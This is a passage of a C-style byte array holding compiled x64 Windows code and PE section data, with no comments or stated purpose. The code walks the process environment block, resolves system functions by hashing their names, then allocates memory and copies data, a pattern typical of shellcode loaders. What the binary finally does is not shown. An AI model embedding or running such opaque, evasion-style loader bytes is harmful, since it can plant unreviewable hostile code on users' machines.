	0xA2, 0x4A, 0x8D, 0x04, 0x8B, 0x42, 0x8B, 0x34, 0x10, 0x49, 0x03, 0xF2,
	0x0F, 0xB6, 0x3E, 0x48, 0xFF, 0xC6, 0x40, 0x84, 0xFF, 0x74, 0x35, 0x90,
	0x40, 0x0F, 0xBE, 0xC7, 0x48, 0x8D, 0x76, 0x01, 0x40, 0x80, 0xEF, 0x41,
	0x8B, 0xD0, 0x83, 0xCA, 0x20, 0x40, 0x80, 0xFF, 0x19, 0x0F, 0xB6, 0x7E,
	0xFF, 0x0F, 0x47, 0xD0, 0x41, 0x33, 0xD0, 0x44, 0x69, 0xC2, 0x93, 0x01,
	0x00, 0x01, 0x40, 0x84, 0xFF, 0x75, 0xD5, 0x41, 0x81, 0xF8, 0x88, 0x4E,
	0x49, 0x2E, 0x74, 0x0D, 0x45, 0x85, 0xC9, 0x75, 0xA7, 0x48, 0x8B, 0x09,
	0xE9, 0x6F, 0xFF, 0xFF, 0xFF, 0x41, 0x8B, 0x4E, 0x24, 0x41, 0xB8, 0x00,
	0x30, 0x00, 0x00, 0x49, 0x03, 0xCA, 0x42, 0x0F, 0xB7, 0x14, 0x49, 0x41,
	0x8B, 0x4E, 0x1C, 0x49, 0x03, 0xCA, 0x8B, 0x04, 0x91, 0xBA, 0x74, 0x00,
	0x00, 0x00, 0x49, 0x03, 0xC2, 0x33, 0xC9, 0x44, 0x8D, 0x4A, 0x90, 0xFF,
	0xD0, 0x0F, 0x28, 0x45, 0x80, 0x48, 0x8B, 0xC8, 0x0F, 0x28, 0x4D, 0x90,
	0x48, 0x8B, 0xF1, 0x8B, 0x55, 0xD8, 0xB9, 0x74, 0x00, 0x00, 0x00, 0x0F,
	0x11, 0x00, 0x4C, 0x8D, 0x68, 0x5C, 0x48, 0x89, 0x45, 0xE0, 0x0F, 0x28,
	0x45, 0xA0, 0x0F, 0x11, 0x48, 0x10, 0x0F, 0x28, 0x4D, 0xB0, 0x0F, 0x11,
	0x40, 0x20, 0x0F, 0x28, 0x45, 0xC0, 0x0F, 0x11, 0x48, 0x30, 0xF2, 0x0F,
	0x10, 0x4D, 0xD0, 0x0F, 0x11, 0x40, 0x40, 0xF2, 0x0F, 0x11, 0x48, 0x50,
	0x89, 0x50, 0x58, 0x48, 0x8B, 0x95, 0xB0, 0x00, 0x00, 0x00, 0x4C, 0x8B,
	0x22, 0x49, 0x83, 0xC4, 0x5C, 0x4C, 0x89, 0x60, 0x06, 0x48, 0x8B, 0x02,
	0x49, 0x89, 0x45, 0x10, 0x48, 0x8B, 0x42, 0x08, 0x49, 0x89, 0x45, 0x08,
	0x48, 0x8B, 0x3A, 0xF3, 0xA4, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00,
	0x00, 0x00, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x8B, 0x40, 0x10, 0x66, 0x90,
	0x4C, 0x8B, 0x50, 0x30, 0x49, 0x63, 0x4A, 0x3C, 0x46, 0x8B, 0xB4, 0x11,
	0x88, 0x00, 0x00, 0x00, 0x4D, 0x03, 0xF2, 0x4D, 0x3B, 0xF2, 0x74, 0x71,
	0x45, 0x8B, 0x4E, 0x18, 0x45, 0x85, 0xC9, 0x74, 0x68, 0x41, 0x8B, 0x5E,
	0x20, 0x66, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x41, 0xFF, 0xC9, 0x41, 0xB8, 0xDF, 0xDF, 0xB7, 0xBE, 0x4A, 0x8D, 0x0C,
	0x8B, 0x42, 0x8B, 0x34, 0x11, 0x49, 0x03, 0xF2, 0x0F, 0xB6, 0x3E, 0x48,
	0xFF, 0xC6, 0x40, 0x84, 0xFF, 0x74, 0x35, 0x90, 0x40, 0x0F, 0xBE, 0xCF,
	0x48, 0x8D, 0x76, 0x01, 0x40, 0x80, 0xEF, 0x41, 0x8B, 0xD1, 0x83, 0xCA,
	0x20, 0x40, 0x80, 0xFF, 0x19, 0x0F, 0xB6, 0x7E, 0xFF, 0x0F, 0x47, 0xD1,
	0x41, 0x33, 0xD0, 0x44, 0x69, 0xC2, 0x93, 0x01, 0x00, 0x01, 0x40, 0x84,
	0xFF, 0x75, 0xD5, 0x41, 0x81, 0xF8, 0x8D, 0xBA, 0x85, 0x8A, 0x74, 0x0D,
	0x45, 0x85, 0xC9, 0x75, 0xA7, 0x48, 0x8B, 0x00, 0xE9, 0x6F, 0xFF, 0xFF,
	0xFF, 0x41, 0x8B, 0x4E, 0x24, 0x4D, 0x8B, 0xC7, 0x48, 0x8B, 0xBD, 0xB0,
	0x00, 0x00, 0x00, 0x49, 0x03, 0xCA, 0x42, 0x0F, 0xB7, 0x14, 0x49, 0x41,
	0x8B, 0x4E, 0x1C, 0x44, 0x8B, 0x8D, 0xC0, 0x00, 0x00, 0x00, 0x49, 0x03,
	0xCA, 0x8B, 0x04, 0x91, 0xB9, 0x03, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x17,
	0x49, 0x03, 0xC2, 0xFF, 0xD0, 0x41, 0x83, 0x7D, 0x00, 0x02, 0x4C, 0x8B,
	0xF8, 0x48, 0x89, 0x85, 0xC8, 0x00, 0x00, 0x00, 0x0F, 0x84, 0xC5, 0x01,
	0x00, 0x00, 0x44, 0x8B, 0xBD, 0xC0, 0x00, 0x00, 0x00, 0x65, 0x48, 0x8B,
	0x0C, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x41, 0x18, 0x48, 0x8B,
	0x40, 0x10, 0x0F, 0x1F, 0x40, 0x00, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0x50, 0x30, 0x49, 0x63, 0x4A, 0x3C,
	0x46, 0x8B, 0xB4, 0x11, 0x88, 0x00, 0x00, 0x00, 0x4D, 0x03, 0xF2, 0x4D,
	0x3B, 0xF2, 0x74, 0x71, 0x45, 0x8B, 0x4E, 0x18, 0x45, 0x85, 0xC9, 0x74,
	0x68, 0x41, 0x8B, 0x5E, 0x20, 0x66, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x41, 0xFF, 0xC9, 0x41, 0xB8, 0xEC, 0xDD, 0x86,
	0xBA, 0x4B, 0x8D, 0x0C, 0x8A, 0x8B, 0x34, 0x19, 0x49, 0x03, 0xF2, 0x0F,
	0xB6, 0x3E, 0x48, 0xFF, 0xC6, 0x40, 0x84, 0xFF, 0x74, 0x36, 0x66, 0x90,
	0x40, 0x0F, 0xBE, 0xCF, 0x48, 0x8D, 0x76, 0x01, 0x40, 0x80, 0xEF, 0x41,
	0x8B, 0xD1, 0x83, 0xCA, 0x20, 0x40, 0x80, 0xFF, 0x19, 0x0F, 0xB6, 0x7E,
	0xFF, 0x0F, 0x47, 0xD1, 0x41, 0x33, 0xD0, 0x44, 0x69, 0xC2, 0x93, 0x01,
	0x00, 0x01, 0x40, 0x84, 0xFF, 0x75, 0xD5, 0x41, 0x81, 0xF8, 0xFA, 0x2E,
	0x72, 0x3D, 0x74, 0x0D, 0x45, 0x85, 0xC9, 0x75, 0xA7, 0x48, 0x8B, 0x00,
	0xE9, 0x6F, 0xFF, 0xFF, 0xFF, 0x41, 0x8B, 0x4E, 0x24, 0x45, 0x33, 0xC0,
	0x49, 0x03, 0xCA, 0x42, 0x0F, 0xB7, 0x14, 0x49, 0x45, 0x33, 0xC9, 0x41,
	0x8B, 0x4E, 0x1C, 0x49, 0x03, 0xCA, 0x8B, 0x04, 0x91, 0x33, 0xD2, 0x49,
	0x03, 0xC2, 0x41, 0x8B, 0xCF, 0xFF, 0xD0, 0xB9, 0x18, 0x00, 0x00, 0x00,
	0x49, 0x8B, 0xFD, 0x49, 0x8B, 0xF4, 0xF3, 0xA4, 0x65, 0x48, 0x8B, 0x04,
	0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x8B, 0x40,
	0x10, 0x66, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x4C, 0x8B, 0x50, 0x30, 0x49, 0x63, 0x4A, 0x3C, 0x46, 0x8B, 0xB4, 0x11,
	0x88, 0x00, 0x00, 0x00, 0x4D, 0x03, 0xF2, 0x4D, 0x3B, 0xF2, 0x74, 0x6D,
	0x45, 0x8B, 0x4E, 0x18, 0x45, 0x85, 0xC9, 0x74, 0x64, 0x41, 0x8B, 0x5E,
	0x20, 0x66, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x41, 0xFF, 0xC9, 0x41, 0xB8, 0x89, 0x45, 0x58, 0xDE, 0x4A, 0x8D, 0x0C,
	0x8B, 0x42, 0x8B, 0x34, 0x11, 0x49, 0x03, 0xF2, 0x0F, 0xB6, 0x0E, 0x48,
	0xFF, 0xC6, 0x84, 0xC9, 0x74, 0x32, 0x66, 0x90, 0x0F, 0xBE, 0xD1, 0x48,
	0x8D, 0x76, 0x01, 0x80, 0xE9, 0x41, 0x8B, 0xFA, 0x83, 0xCF, 0x20, 0x80,
	0xF9, 0x19, 0x0F, 0xB6, 0x4E, 0xFF, 0x0F, 0x47, 0xFA, 0x41, 0x33, 0xF8,
	0x44, 0x69, 0xC7, 0x93, 0x01, 0x00, 0x01, 0x84, 0xC9, 0x75, 0xD9, 0x41,
	0x81, 0xF8, 0x8C, 0x41, 0xAB, 0x52, 0x74, 0x0D, 0x45, 0x85, 0xC9, 0x75,
	0xAB, 0x48, 0x8B, 0x00, 0xE9, 0x73, 0xFF, 0xFF, 0xFF, 0x41, 0x8B, 0x4E,
	0x24, 0x49, 0x03, 0xCA, 0x42, 0x0F, 0xB7, 0x14, 0x49, 0x41, 0x8B, 0x4E,
	0x1C, 0x49, 0x03, 0xCA, 0x8B, 0x04, 0x91, 0xB9, 0x0A, 0x00, 0x00, 0x00,
	0x49, 0x03, 0xC2, 0xFF, 0xD0, 0x41, 0x83, 0x7D, 0x00, 0x02, 0x0F, 0x85,
	0x49, 0xFE, 0xFF, 0xFF, 0x4C, 0x8B, 0xBD, 0xC8, 0x00, 0x00, 0x00, 0x65,
	0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x18,
	0x48, 0x8B, 0x40, 0x10, 0x4C, 0x8B, 0x50, 0x30, 0x49, 0x63, 0x4A, 0x3C,
	0x46, 0x8B, 0xB4, 0x11, 0x88, 0x00, 0x00, 0x00, 0x4D, 0x03, 0xF2, 0x4D,
	0x3B, 0xF2, 0x74, 0x71, 0x45, 0x8B, 0x4E, 0x18, 0x45, 0x85, 0xC9, 0x74,
	0x68, 0x41, 0x8B, 0x5E, 0x20, 0x66, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x41, 0xFF, 0xC9, 0x41, 0xB8, 0x4D, 0xBD, 0xA8,
	0x2E, 0x4A, 0x8D, 0x0C, 0x8B, 0x42, 0x8B, 0x34, 0x11, 0x49, 0x03, 0xF2,
	0x0F, 0xB6, 0x3E, 0x48, 0xFF, 0xC6, 0x40, 0x84, 0xFF, 0x74, 0x35, 0x90,
	0x40, 0x0F, 0xBE, 0xCF, 0x48, 0x8D, 0x76, 0x01, 0x40, 0x80, 0xEF, 0x41,
	0x8B, 0xD1, 0x83, 0xCA, 0x20, 0x40, 0x80, 0xFF, 0x19, 0x0F, 0xB6, 0x7E,
	0xFF, 0x0F, 0x47, 0xD1, 0x41, 0x33, 0xD0, 0x44, 0x69, 0xC2, 0x93, 0x01,
	0x00, 0x01, 0x40, 0x84, 0xFF, 0x75, 0xD5, 0x41, 0x81, 0xF8, 0x20, 0x5D,
	0x54, 0xE3, 0x74, 0x0D, 0x45, 0x85, 0xC9, 0x75, 0xA7, 0x48, 0x8B, 0x00,
	0xE9, 0x6F, 0xFF, 0xFF, 0xFF, 0x41, 0x8B, 0x4E, 0x24, 0x49, 0x03, 0xCA,
	0x42, 0x0F, 0xB7, 0x14, 0x49, 0x41, 0x8B, 0x4E, 0x1C, 0x49, 0x03, 0xCA,
	0x8B, 0x04, 0x91, 0x49, 0x8B, 0xCF, 0x49, 0x03, 0xC2, 0xFF, 0xD0, 0x65,
	0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xBC, 0x24,
	0x68, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x8B, 0x40, 0x10,
	0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0x50, 0x30,
	0x49, 0x63, 0x4A, 0x3C, 0x46, 0x8B, 0xB4, 0x11, 0x88, 0x00, 0x00, 0x00,
	0x4D, 0x03, 0xF2, 0x4D, 0x3B, 0xF2, 0x74, 0x71, 0x45, 0x8B, 0x4E, 0x18,
	0x45, 0x85, 0xC9, 0x74, 0x68, 0x41, 0x8B, 0x5E, 0x20, 0x66, 0x66, 0x66,
	0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0xFF, 0xC9, 0x41,
	0xB8, 0xF8, 0xE6, 0x3C, 0x4B, 0x4A, 0x8D, 0x0C, 0x8B, 0x42, 0x8B, 0x34,
	0x11, 0x49, 0x03, 0xF2, 0x0F, 0xB6, 0x3E, 0x48, 0xFF, 0xC6, 0x40, 0x84,
	0xFF, 0x74, 0x35, 0x90, 0x40, 0x0F, 0xBE, 0xCF, 0x48, 0x8D, 0x76, 0x01,
	0x40, 0x80, 0xEF, 0x41, 0x8B, 0xD1, 0x83, 0xCA, 0x20, 0x40, 0x80, 0xFF,
	0x19, 0x0F, 0xB6, 0x7E, 0xFF, 0x0F, 0x47, 0xD1, 0x41, 0x33, 0xD0, 0x44,
	0x69, 0xC2, 0x93, 0x01, 0x00, 0x01, 0x40, 0x84, 0xFF, 0x75, 0xD5, 0x41,
	0x81, 0xF8, 0x39, 0xFC, 0xEB, 0x23, 0x74, 0x0D, 0x45, 0x85, 0xC9, 0x75,
	0xA7, 0x48, 0x8B, 0x00, 0xE9, 0x6F, 0xFF, 0xFF, 0xFF, 0x41, 0x8B, 0x4E,
	0x24, 0x41, 0xB8, 0x00, 0x80, 0x00, 0x00, 0x49, 0x03, 0xCA, 0x42, 0x0F,
	0xB7, 0x14, 0x49, 0x41, 0x8B, 0x4E, 0x1C, 0x49, 0x03, 0xCA, 0x8B, 0x04,
	0x91, 0x33, 0xD2, 0x48, 0x8B, 0x4D, 0xE0, 0x49, 0x03, 0xC2, 0xFF, 0xD0,
	0x48, 0x81, 0xC4, 0x70, 0x01, 0x00, 0x00, 0x41, 0x5E, 0x41, 0x5D, 0x41,
	0x5C, 0x5F, 0x5E, 0x5B, 0x5D, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x5F, 0x2E, 0x3E, 0x62,
	0x00, 0x00, 0x00, 0x00, 0x0D, 0x00, 0x00, 0x00, 0xA0, 0x00, 0x00, 0x00,
	0x50, 0x30, 0x00, 0x00, 0x50, 0x1C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x5F, 0x2E, 0x3E, 0x62, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x18, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x47, 0x43, 0x54, 0x4C, 0x00, 0x10, 0x00, 0x00, 0x9A, 0x16, 0x00, 0x00,
	0x2E, 0x74, 0x65, 0x78, 0x74, 0x24, 0x6D, 0x6E, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x30, 0x00, 0x00, 0x38, 0x00, 0x00, 0x00, 0x2E, 0x72, 0x64, 0x61,
	0x74, 0x61, 0x00, 0x00, 0x38, 0x30, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00,
	0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x24, 0x76, 0x6F, 0x6C, 0x74, 0x6D,
	0x64, 0x00, 0x00, 0x00, 0x50, 0x30, 0x00, 0x00, 0xA0, 0x00, 0x00, 0x00,
	0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x24, 0x7A, 0x7A, 0x7A, 0x64, 0x62,
	0x67, 0x00, 0x00, 0x00, 0xF0, 0x30, 0x00, 0x00, 0x44, 0x00, 0x00, 0x00,
	0x2E, 0x78, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00,
	0x30, 0x00, 0x00, 0x00, 0x2E, 0x70, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00,
	0x00, 0x50, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x2E, 0x72, 0x73, 0x72,
	0x63, 0x24, 0x30, 0x31, 0x00, 0x00, 0x00, 0x00, 0x60, 0x50, 0x00, 0x00,
	0x80, 0x01, 0x00, 0x00, 0x2E, 0x72, 0x73, 0x72, 0x63, 0x24, 0x30, 0x32,
	0x00, 0x00, 0x00, 0x00, 0x01, 0x05, 0x02, 0x00, 0x05, 0x34, 0x01, 0x00,
	0x01, 0x1B, 0x09, 0x00, 0x1B, 0x01, 0x2E, 0x00, 0x0F, 0xE0, 0x0D, 0xD0,
	0x0B, 0xC0, 0x09, 0x70, 0x08, 0x60, 0x07, 0x30, 0x06, 0x50, 0x00, 0x00,
	0x21, 0x08, 0x02, 0x00, 0x08, 0xF4, 0x2D, 0x00, 0x10, 0x15, 0x00, 0x00,
	0x12, 0x16, 0x00, 0x00, 0xF8, 0x30, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00,
	0x10, 0x15, 0x00, 0x00, 0x12, 0x16, 0x00, 0x00, 0xF8, 0x30, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x80, 0x10, 0x00, 0x00, 0xC5, 0x12, 0x00, 0x00, 0xF0, 0x30, 0x00, 0x00,
	0x10, 0x15, 0x00, 0x00, 0x12, 0x16, 0x00, 0x00, 0xF8, 0x30, 0x00, 0x00,
	0x12, 0x16, 0x00, 0x00, 0xD0, 0x25, 0x00, 0x00, 0x10, 0x31, 0x00, 0x00,
	0xD0, 0x25, 0x00, 0x00, 0x9A, 0x26, 0x00, 0x00, 0x24, 0x31, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00,
	0x18, 0x00, 0x00, 0x00, 0x18, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00,
	0x01, 0x00, 0x00, 0x00, 0x30, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00,
	0x09, 0x04, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x60, 0x50, 0x00, 0x00,
